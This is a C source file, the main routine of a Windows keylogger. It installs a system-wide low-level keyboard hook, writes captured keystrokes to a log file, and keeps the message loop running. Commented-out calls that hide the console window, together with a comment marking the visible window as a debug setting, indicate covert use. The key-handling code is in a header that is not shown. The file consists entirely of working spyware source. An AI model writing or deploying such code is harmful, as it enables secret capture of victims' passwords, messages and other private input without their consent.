//#include <windows.h>
//#include <stdio.h>
//#include <stdlib.h>
//#include <string.h>
//#include <ctype.h>
//#include <time.h>

#include "keys_handler.h"
#define PATH "test-log.txt" // The path to the log file


//LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
//void log(char *str);
//char *translate(int vk, int up);

FILE *fd;

int main(int argc, char *argv[]) {
//    HWND self = GetConsoleWindow();
    HWND self = FindWindowA("ConsoleWindowClass", NULL);
//    ShowWindow(self, SW_HIDE);
    // SW_SHOWNORMAL for debug
    ShowWindow(self, SW_SHOWNORMAL);
    HINSTANCE app = GetModuleHandle(NULL);
    MSG msg;

    const char *fname;
    if (argc < 2) fname = PATH;
    else fname = argv[1];

    fd = fopen(fname, "w");
    SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);

    while (GetMessage(&msg, NULL, 0, 0) > 0) {
//        ShowWindow(self, SW_HIDE);
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    fflush(fd);
    fclose(fd);
    return 0;
}

